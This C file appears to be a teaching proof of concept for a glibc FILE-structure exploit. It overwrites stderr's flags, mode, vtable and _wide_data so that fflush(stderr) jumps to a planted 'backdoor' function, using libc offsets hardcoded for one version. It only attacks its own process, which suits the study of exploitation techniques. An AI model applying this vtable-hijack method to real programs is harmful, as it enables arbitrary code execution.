#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>
#include<unistd.h>
#include <string.h>

void backdoor()
{
    printf("\033[31m[!] Backdoor is called!\n");
    _exit(0);
}

void main()
{
    setbuf(stdout, 0);
    setbuf(stdin, 0);
    setbuf(stderr, 0);

    char *p1 = calloc(0x200, 1);
    char *p2 = calloc(0x200, 1);
    puts("[*] allocate two 0x200 chunks");

    size_t puts_addr = (size_t)&puts;
    printf("[*] puts address: %p\n", (void *)puts_addr);
    size_t libc_base_addr = puts_addr - 0x83630;
    printf("[*] libc base address: %p\n", (void *)libc_base_addr);

    size_t _IO_2_1_stderr_addr = libc_base_addr + 0x1ff6c0;
    printf("[*] _IO_2_1_stderr_ address: %p\n", (void *)_IO_2_1_stderr_addr);

    size_t _IO_wstrn_jumps_addr = libc_base_addr + 0x1fd468;
    printf("[*] _IO_wstrn_jumps address: %p\n", (void *)_IO_wstrn_jumps_addr);
 
    char *stderr2 = (char *)_IO_2_1_stderr_addr;
    puts("[+] step 1: change stderr->_flags to 0x800");
    *(size_t *)stderr2 = 0x800;

    puts("[+] step 2: change stderr->_mode to 1");
    *(size_t *)(stderr2 + 0xc0) = 1;
 
    puts("[+] step 3: change stderr->vtable to _IO_wstrn_jumps-0x20");
    *(size_t *)(stderr2 + 0xd8) = _IO_wstrn_jumps_addr-0x20;
 
    puts("[+] step 4: replace stderr->_wide_data with the allocated chunk p1");
    *(size_t *)(stderr2 + 0xa0) = (size_t)p1;
 
    puts("[+] step 5: set stderr->_wide_data->_wide_vtable with the allocated chunk p2");
    *(size_t *)(p1 + 0xe0) = (size_t)p2;

    puts("[+] step 6: set stderr->_wide_data->_wide_vtable->_IO_write_ptr >  stderr->_wide_data->_wide_vtable->_IO_write_base");
    *(size_t *)(p1 + 0x20) = (size_t)1;

    puts("[+] step 7: put backdoor at fake _wide_vtable->_overflow");
    *(size_t *)(p2 + 0x18) = (size_t)(&backdoor);

    puts("[+] step 8: call fflush(stderr) to trigger backdoor func");
    fflush(stderr);

}